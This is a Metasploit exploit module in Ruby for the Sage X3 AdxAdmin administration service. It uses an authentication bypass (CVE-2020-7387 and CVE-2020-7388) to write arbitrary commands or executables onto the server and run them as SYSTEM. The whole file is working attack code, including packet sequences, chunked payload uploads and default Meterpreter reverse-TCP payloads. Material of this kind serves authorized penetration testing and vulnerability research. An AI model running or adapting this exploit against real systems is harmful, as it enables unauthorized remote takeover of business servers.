#
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Sage X3 Administration Service Command Execution',
      'Description'    => %q{
      This module leverages an authentication bypass exploit within Sage X3 AdxSrv's administration 
      protocol to execute arbitrary commands as SYSTEM against a Sage X3 Server running an
       available AdxAdmin service.
      },
      'Author'         => [
        'Jonathan Peterson <deadjakk[at]shell.rip>', #@deadjakk
        'Aaron Herndon' #@ac3lives
      ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => 'July 7 2020',
      'References'     =>
        [
          [ 'URL', 'https://www.rapid7.com/blog/post/2021/07/07/cve-2020-7387-7390-multiple-sage-x3-vulnerabilities/'],
          [ 'CVE', 'CVE-2020-7388'],
          [ 'CVE', 'CVE-2020-7387']
        ],
      'Privileged'     => true,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
          'DisablePayloadHandler' => true
        },
      'Platform'       => 'win',
      'Arch'           => [ARCH_X86, ARCH_X64, ARCH_CMD],
      'Targets' => [
          [
            'Windows Command',
            {
              'Arch'     => [ARCH_CMD],
              'DefaultOptions' => {
                'DisablePayloadHandler' => true,
                'PAYLOAD' => 'cmd/windows/generic',
                'CMD' => 'whoami'
              }
            }
          ],
          [
            'Custom Executable',
            {
              'Arch'     => [ARCH_CMD],
              'DefaultOptions' => {
                'DisablePayloadHandler' => true
              }
            }
          ],
          [
            'Windows DLL',
            {
              'Platform' => [ 'windows' ],
              'Arch'     => [ARCH_X86,ARCH_X64],
              'DefaultOptions' => {
                'DisablePayloadHandler' => false,
                'PAYLOAD' => 'windows/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Windows Executable',
            {
              'Platform' => [ 'windows' ],
              'Arch'     => [ARCH_X86,ARCH_X64],
              'DefaultOptions' => {
                'DisablePayloadHandler' => false,
                'PAYLOAD' => 'windows/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
      'DefaultTarget' => 0))
    register_options(
      [
        Opt::RPORT(1818),
        OptPath.new("FILENAME",[false,'File for CUSTOM_EXE target','']),
      ])

  end

  def check()
    if adxdir() == false
      return Msf::Exploit::CheckCode::Safe
    end
    return Msf::Exploit::CheckCode::Appears
  end

  def adxdir()
    s = connect
    print_status("connected")
    # user and pass doesn't need to be valid
    # they only need to exist

    # ADXDIR command authentication header

    auth_packet =  "\x09\x00" # allows for unauthenticated retrieval of X3 directory
    s.write(auth_packet)

    # recv thing
    res = s.read(1024)
    if res.nil? || res.length != 4
      print_bad("ADXDIR authentication failed.")
      return false
    end
    print_good("ADXDIR authentication successful.")

    # ADXDIR command
    adx_dir_msg = "\x07\x41\x44\x58\x44\x49\x52\x00"
    s.write(adx_dir_msg)
    directory = s.read(1024)
    if directory.nil?
      print_bad("Directory message did not provide response")
      return false
    end
    print_good("Received directory info from host: %s" % [directory[4..-2]])
    disconnect
    return directory[4..-2]
  end

  def build_buffer(head,payload,tail)
    buffer = ""
    unless head.nil?
      # do things
      buffer << head
    end

    buffer << payload.length
    buffer << payload

    unless tail.nil?
      buffer << tail
    end
    return buffer
  end

  def write_file (s,filenum,payload,target,sagedir)
    # building the initial authentication packet
    # [2bytes][userlen 1 byte][username][userlen 1 byte][username][passlen 1 byte][CRYPT:HASH]
    # Note: the first byte of this auth packet is different from the ADXDIR command

    revsagedir = sagedir.gsub("\\","/")

    s.write("\x06\x00")
    auth_resp = s.read(1024)
    if auth_resp.length != 4
      print_bad("Command authentication failed.")
      return
    end
    print_good("Command authentication successful.")

    # May require additional information such as file path
    # this will be used for multiple messages

    head = "\x00\x00\x36\x02\x00\x2e\x00" # head
    fmt = "@%s/tmp/cmd%s$cmd" 
    if target == 'Windows DLL'
        fmt = "@%s/tmp/cmd%s.dll" 
    end
    if target == 'Windows Executable' or target== 'Custom Executable'
        fmt = "@%s/tmp/cmd%s.exe" 
    end
    pload = fmt % [revsagedir,filenum]
    tail = "\x00\x03\x00\x01\x77"
    sendbuf = build_buffer(head,pload,tail)
    s.write(sendbuf)
    s.read(1024)
    
    # Packet --- 3
    # Creating the packet that contains the command to run
    head = "\x02\x00\x05\x08\x00\x00\x00"

    # this writes the data to the .cmd file to get executed
    # a single write can't be larger than ~250 bytes
    # so writes larger than 250 need to be broken up
    written = 0
    print_status("Writing data")
    while written < payload.length
      print(".")
      towrite = payload[written..written+250]
      sendbuf = build_buffer(head,towrite,nil)
      s.write(sendbuf)
      s.recv(1024)
      
      written += towrite.length 
    end
    print("\r\n")
  end

  def exploit
    unless datastore['CMD'].blank?
      payload = datastore['CMD']
    end
    if target.name == 'Windows Command' and payload.blank?
      print_bad("Select a different target or set CMD option")
      return
    end
    if target.name == 'Windows DLL'
      payload = generate_payload_dll
    end
    if target.name == 'Windows Executable' 
      payload = generate_payload_exe
    end

    # Read the contents of the provided filename into the payload variable
    if target.name == 'Custom Executable' 
      if datastore['FILENAME'].empty?
        print_bad("You selected CUSTOM_EXE as the target but did not provide a file, aborting.")
        return
      end
      file_handle = File.open(datastore['FILENAME'])
      if file_handle.nil?
        print_bad("Provided file was unable to be opened, does it exist? Aborting.")
        return
      end
      payload = file_handle.read()
      file_handle.close()
      if payload.empty? or payload.nil?
        print_bad("File contents were empty")
        return
      end
    end

    sagedir = adxdir
    revsagedir = sagedir.gsub("\\","/")
    filename = datastore['FILENAME']
    filenum = rand(10000000..99999999)
    filenum = filenum.to_s
    print_status("Using generated filename: %s" % [filenum])

    s = connect

    write_file(s,filenum,payload,target.name,sagedir)

    unless target.name == 'Windows Command'
      disconnect
      # re-establish connection after writing file
      s = connect
    end

    if target.name == 'Windows DLL'
      payload = "rundll32.exe #{sagedir}\\tmp\\cmd#{filenum}.dll,0"
      print_status(payload)
      write_file(s,filenum,payload,false,sagedir)
    end

    if target.name == 'Windows Executable' or target.name == 'Custom Executable'
      payload = "#{sagedir}\\tmp\\cmd#{filenum}.exe"
      print_status(payload)
      write_file(s,filenum,payload,false,sagedir)
    end

    # Some sort of delimeter
    delim_0 = "\x02\x00\x01\x01" # bufm
    s.write(delim_0)
    s.recv(1024)

    # Packet --- 4
    payload = "@%s/tmp/sess%s$cmd" % [revsagedir,filenum]
    head = "\x00\x00\x37\x02\x00\x2f\x00"
    tail = "\x00\x03\x00\x01\x77"
    sendbuf = build_buffer(head,payload,tail)
    s.write(sendbuf)
    s.recv(1024)

    # Packet --- 5
    head = "\x02\x00\x05\x08\x00\x00\x00"
    payload= "@echo off\r\n%s\\tmp\\cmd%s.cmd 1>%s\\tmp\\%s.out 2>%s\\tmp\\%s.err\r\n@echo on" % [
            sagedir,filenum,sagedir,filenum,sagedir,filenum
      ]
    sendbuf = build_buffer(head,payload,nil)
    s.write(sendbuf)
    s.recv(1024)

    # Packet --- Delim
    s.write(delim_0)
    s.recv(1024)

    # Packet --- 6
    head = "\x00\x00\x36\x04\x00\x2e\x00"
    payload = "%s\\tmp\\sess%s.cmd" % [revsagedir,filenum]
    tail = "\x00\x03\x00\x01\x72"
    sendbuf = build_buffer(head,payload,tail)
    s.write(sendbuf)
    s.recv(1024)

    # if it's not COMMAND, we can stop here
    # otherwise, we'll send/recv the last bit
    # of info for the output 
    unless target.name == 'Windows Command' 
      disconnect
      return
    end

    # Packet --- Delim
    delim_1="\x02\x00\x05\x05\x00\x00\x10\x00"
    s.write(delim_1)
    s.recv(1024)

    # Packet --- Delim
    s.write(delim_0)
    s.recv(1024)

    # The two below are directing the server to read from the .out file that should have been created
    # Then we get the output back
    # Packet --- 7 - Still works when removed.
    head = "\x00\x00\x2f\x07\x08\x00\x2b\x00"
    payload = "@%s/tmp/%s$out" % [revsagedir,filenum]
    sendbuf = build_buffer(head,payload,nil)
    s.write(sendbuf)
    s.recv(1024)

    # Packet --- 8
    head = "\x00\x00\x33\x02\x00\x2b\x00"
    payload = "@%s/tmp/%s$out" % [revsagedir,filenum]
    tail = "\x00\x03\x00\x01\x72"
    sendbuf = build_buffer(head,payload,tail)
    s.write(sendbuf)
    s.recv(1024)

    s.write(delim_1)
    returned_data = s.recv(8096)
    if returned_data.nil? or returned_data.empty?
      print_bad("No data appeared to be returned")
      disconnect
      return
    end
    print_good("------------ Response ------------")
    print_status(returned_data)

    disconnect
  end
end
